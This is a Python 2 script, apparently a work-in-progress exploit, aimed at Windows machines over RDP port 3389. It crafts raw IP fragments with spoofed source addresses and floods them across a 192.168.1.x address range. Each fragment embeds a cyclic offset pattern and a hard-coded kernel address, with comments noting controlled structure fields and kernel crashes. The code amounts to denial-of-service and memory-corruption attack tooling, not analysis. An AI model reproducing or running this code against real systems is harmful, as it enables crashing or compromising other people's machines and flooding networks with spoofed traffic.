import socket, sys
import struct
import time

def make_packet(dest_ip, tcp_source, source_ip, tcp_dest, ip_id, chunk, desired_size = 0x8c):

    packet = '';
    # ip header fields
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0	# kernel will fill the correct total length
    ip_id = 0x4242#54321	#Id of this packet
    ip_frag_flags = 0x1
    ip_frag_off = chunk#0x8c

    #ip_frag_off = (ip_frag_flags | (ip_frag_off << 3)) & 0xffff
    ip_frag_off = 0x2000 | ip_frag_off

    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0	# kernel will fill the correct checksum
    ip_saddr = socket.inet_aton ( source_ip )	#Spoof the source ip address if you want to
    ip_daddr = socket.inet_aton ( dest_ip )

    ip_ihl_ver = (ip_ver << 4) + ip_ihl


    # the ! in the pack format string means network order
    ip_header = struct.pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    #print("%02x" % len(ip_header))
    filler = desired_size - len(ip_header)# - 0x18#- 0x2c

    pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"
    #pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

    desired_address = 0xfffffa8010000350
    channel_struct = "" # we control 0x2c-0x8c
    channel_struct += pattern[0:8]
    channel_struct += "\x00" * 8
    channel_struct += pattern[16:176]
    channel_struct += struct.pack("<Q", desired_address)
    channel_struct += pattern[176+8:filler]
    #channel_struct += pattern[0:193]
    #channel_struct += "\x10\x00\xd0\xff\xff\xff\xff\xff"  # ffffffffffd00010  # crashing in nt!ExpCheckForIoPriorityBoost+e2
    ##channel_struct += pattern[201:224] # Unknown
    #channel_struct += "\x10\x00\xd0\xff\xff\xff\xff\xff" # ffffffffffd00010  # crashing in nt!ExpCheckForIoPriorityBoost+e2
    #channel_struct += pattern[232:filler] # Unknown
    # ffdff034  has a ptr to nt!KdVersionBlock
    return ip_header + channel_struct #pattern[0:36] + "\x00\x00\x00\x00" + pattern[40:filler] #"A" * filler

def flood_ip(s, dest_ip, dest_port, source_ip, amount, size = 0x8c):
    for x in range(0, amount):
        chunk = (x+1) * 0xff
        id = x#420

        amt = s.sendto(make_packet(dest_ip, 3389, source_ip, 4200, id, chunk, size), (dest_ip , 0 ))
        #print("SENT %d bytes" % (amt))

class Fragger():
    def __init__(self, target, port = 3389):
        try:
            self.target = target
            self.port = port
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except socket.error , msg:
            print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
            sys.exit()

    def frag_ip(self, source_ip, amount, size = 0x124):
        flood_ip(self.sock, self.target, self.port, source_ip, amount, size)

    def frag_range(self, start, end, amount, size = 0x124, prefix="192.168.1."):
        for i in range(start, end):
            ip = prefix + str(i)
            self.frag_ip(ip, amount, size)
        '''
        for x in range(0, 255):
            prefix = "192.168." + str(x) + "."
            for i in range(start, end):
                ip = prefix + str(i)
                self.frag_ip(ip, amount, size)
        '''

if __name__ == "__main__":
    import sys
    f = Fragger(sys.argv[1])
    #f.frag_ip("192.168.1.203", 1, 0x124)
    f.frag_range(1, 255, 100, 0x124)
